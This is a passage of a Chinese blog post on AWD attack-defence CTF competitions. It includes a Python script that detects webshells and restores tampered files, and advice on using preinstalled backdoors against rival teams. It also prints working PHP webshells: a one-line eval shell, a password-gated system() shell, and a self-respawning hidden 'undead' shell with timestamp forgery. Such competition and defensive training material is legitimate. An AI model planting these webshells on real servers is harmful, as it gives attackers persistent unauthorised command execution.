class="hljs-string">&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class="hljs-built_in">ord</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> unicode(value)<br>        <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>            <span class="hljs-keyword">return</span> unicode(<span class="hljs-built_in">str</span>(value), errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><span class="hljs-comment"># 目录创建</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mkdir_p</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">import</span> errno<br>    <span class="hljs-keyword">try</span>:<br>        os.makedirs(path)<br>    <span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> exc:<br>        <span class="hljs-keyword">if</span> exc.errno == errno.EEXIST <span class="hljs-keyword">and</span> os.path.isdir(path):<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>: <span class="hljs-keyword">raise</span><br><br><span class="hljs-comment"># 获取当前所有文件路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getfilelist</span>(<span class="hljs-params">cwd</span>):<br>    filelist = []<br>    <span class="hljs-keyword">for</span> root,subdirs, files <span class="hljs-keyword">in</span> os.walk(cwd):<br>        <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> files:<br>            originalfile = os.path.join(root, filepath)<br>            <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> originalfile:<br>                filelist.append(originalfile)<br>    <span class="hljs-keyword">return</span> filelist<br><br><span class="hljs-comment"># 计算机文件MD5值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calcMD5</span>(<span class="hljs-params">filepath</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            md5obj = hashlib.md5()<br>            md5obj.update(f.read())<br>            <span class="hljs-built_in">hash</span> = md5obj.hexdigest()<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span><br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)<br>        <span class="hljs-built_in">print</span> getUnicode(e)<br>        <span class="hljs-keyword">try</span>:<br>            ORIGIN_FILE_LIST.remove(filepath)<br>            FILE_MD5_DICT.pop(filepath, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">except</span> KeyError, e:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># 获取所有文件MD5</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getfilemd5dict</span>(<span class="hljs-params">filelist = []</span>):<br>    filemd5dict = &#123;&#125;<br>    <span class="hljs-keyword">for</span> ori_file <span class="hljs-keyword">in</span> filelist:<br>        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ori_file:<br>            md5 = calcMD5(os.path.realpath(ori_file))<br>            <span class="hljs-keyword">if</span> md5:<br>                filemd5dict[ori_file] = md5<br>    <span class="hljs-keyword">return</span> filemd5dict<br><br><span class="hljs-comment"># 备份所有文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backup_file</span>(<span class="hljs-params">filelist=[]</span>):<br>    <span class="hljs-comment"># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br>    <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> filelist:<br>        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filepath:<br>            shutil.copy2(filepath, Special_path[<span class="hljs-string">&#x27;bak&#x27;</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;---------start------------&#x27;</span><br>    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> Special_path:<br>        mkdir_p(Special_path[value])<br>    <span class="hljs-comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span><br>    ORIGIN_FILE_LIST = getfilelist(CWD)<br>    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)<br>    backup_file(ORIGIN_FILE_LIST) <span class="hljs-comment"># TODO 备份文件可能会产生重名BUG</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] pre work end!&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        file_list = getfilelist(CWD)<br>        <span class="hljs-comment"># 移除新上传文件</span><br>        diff_file_list = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(file_list) ^ <span class="hljs-built_in">set</span>(ORIGIN_FILE_LIST))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(diff_file_list) != <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># import pdb;pdb.set_trace()</span><br>            <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> diff_file_list:<br>                <span class="hljs-keyword">try</span>:<br>                    f = <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>                <span class="hljs-keyword">except</span> Exception, e:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)<br>                        shutil.move(filepath, os.path.join(Special_path[<span class="hljs-string">&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class="hljs-string">&#x27;.txt&#x27;</span>))<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)<br>                    <span class="hljs-keyword">try</span>:<br>                        f = <span class="hljs-built_in">open</span>(os.path.join(Special_path[<span class="hljs-string">&#x27;log&#x27;</span>], <span class="hljs-string">&#x27;log.txt&#x27;</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>                        f.write(<span class="hljs-string">&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class="hljs-string">&#x27; : &#x27;</span> + <span class="hljs-built_in">str</span>(time.ctime()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)<br><br>        <span class="hljs-comment"># 防止任意文件被修改,还原被修改文件</span><br>        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)<br>        <span class="hljs-keyword">for</span> filekey <span class="hljs-keyword">in</span> md5_dict:<br>            <span class="hljs-keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:<br>                <span class="hljs-keyword">try</span>:<br>                    f = <span class="hljs-built_in">open</span>(filekey, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>                <span class="hljs-keyword">except</span> Exception, e:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)<br>                        shutil.move(filekey, os.path.join(Special_path[<span class="hljs-string">&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class="hljs-string">&#x27;.txt&#x27;</span>))<br>                        shutil.move(os.path.join(Special_path[<span class="hljs-string">&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)<br>                    <span class="hljs-keyword">try</span>:<br>                        f = <span class="hljs-built_in">open</span>(os.path.join(Special_path[<span class="hljs-string">&#x27;log&#x27;</span>], <span class="hljs-string">&#x27;log.txt&#x27;</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>                        f.write(<span class="hljs-string">&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class="hljs-string">&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)<br>                        <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-comment"># print &#x27;[*] &#x27; + getUnicode(time.ctime())</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="6-预留后门"><a href="#6-预留后门" class="headerlink" title="6. 预留后门"></a>6. 预留后门</h3><blockquote>
+<p>一般来说，在每一台服务器上可能已经预留了一个或多个后门，这时候我们就可以把一开始备份的源码传输到本地，拖进D盾里扫一扫，发现后门的话可以先把自己的后门处理掉，然后利用这个后门看看能不能去打一下别人，传个马之类的</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/03/30/e1KgfhJclHopNB7.png" srcset="/img/loading.gif" lazyload alt="image-20210330090345761"></p>
+<h3 id="7-权限维持"><a href="#7-权限维持" class="headerlink" title="7. 权限维持"></a>7. 权限维持</h3><blockquote>
+<p>说道权限维持，那肯定是一句话木马，不死马，反弹shell等一系列操作了，发现漏洞之后传个马，才有利于后面更好的得分</p>
+</blockquote>
+<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>一句话木马那方法就很多了，比如最简单的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(REQUEST[<span class="hljs-string">&#x27;diaossama&#x27;</span>]); <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//php</span><br>&lt;%<span class="hljs-keyword">eval</span> <span class="hljs-title function_ invoke__">request</span>(<span class="hljs-string">&quot;xx&quot;</span>)%&gt;    <span class="hljs-comment">//aspCopy</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="MD5马"><a href="#MD5马" class="headerlink" title="MD5马"></a>MD5马</h4><p>但是这种一句话木马很容易被人利用，你想想你把别人服务器弄了，结果别人一看你的shell密码转头就用你的shell去弄别人，那不是被人白嫖。所以就有了其他的马，比如MD5马和RSA马，下面就是一个MD5马的例子（还可以加header双重验证）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]) == <span class="hljs-string">&quot;78842815248300fa6ae79f7776a5080a&quot;</span>)&#123; @ <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[cmd]);&#125;<span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//pass:jonathan</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h4><blockquote>
+<p>有了MD5马还不够，我们还得让我们的马可以一直留存在别人的服务器上，所以就有了不死马。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.conf.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;78842815248300fa6ae79f7776a5080a&quot;)&#123;@system($_POST[cmd]);&#125;?&gt;&#x27;</span>; <br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .conf.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><br>pass:jonathan<br><br></code></pre></td></tr></table></figure>
+
+<p>知道了怎么写不死马，那就得知道怎么杀不死马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br> <span class="hljs-variable">$pid</span>=<span class="hljs-number">1234</span>;<br> @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;.demo.php&#x27;</span>);<br> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;kill -9 $pid&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>先用<code>ps</code>命令查看进程的pid，再修改一下上面的脚本执行即可</p>
+<p>或者我们也可以用<code>ps aux</code>命令来查看每个用户执行的命令和运行的进程</p>
+<p>一般是写一个脚本不断生成那个不死马的同名文件，使那个不死马无法在该目录下创建文件，然后再找到那个不断创建不死马的进程将其杀死。</p>
+</blockquote>
+<h3 id="8-日志分析"><a href="#8-日志分析" class="headerlink" title="8. 日志分析"></a>8. 日志分析</h3><blockquote>
+<p>比赛中如果抓不到有用的流量，日志分析也是很有用的，分析服务器的访问日志也可以发现一些信息，下面罗列了一些服务器的日志路径</p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">apache: <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log<br>nginx: <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="9-最重要的事情"><a href="#9-最重要的事情" class="headerlink" title="9.最重要的事情"></a>9.最重要的事情</h3><p>所谓最重要的事情就是团队合作的问题</p>
+<p><strong>分工明确</strong> 是重中之重 每个人分配好每个人的工作 密码更改成什么 都是双方约定好的 备份的文件存放位置也是固定好的</p>
+<p>这样就会很有条理 什么做了 什么没做 心里都有数</p>
+<p>一个人的事情做好了 就去做可以共同做的事情比如代码审计 把可以利用的点 截图放到一个文档里面 以免忘记 在可以攻击的时候利用这些已知的点进行攻击</p>
+<p>一位同学负责攻 一位同学负责辅助攻击的同时继续加固服务器。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/AWD/">AWD</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/03/OSCP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%83%A8%E5%88%86/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OSCP学习笔记(部分)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%9A%84%E5%8E%9F%E7%A0%81-%E5%8F%8D%E7%A0%81-%E8%A1%A5%E7%A0%81/">
+                        <span class="hidden-mobile">计算机中的原码 反码 补码</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?17691437";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
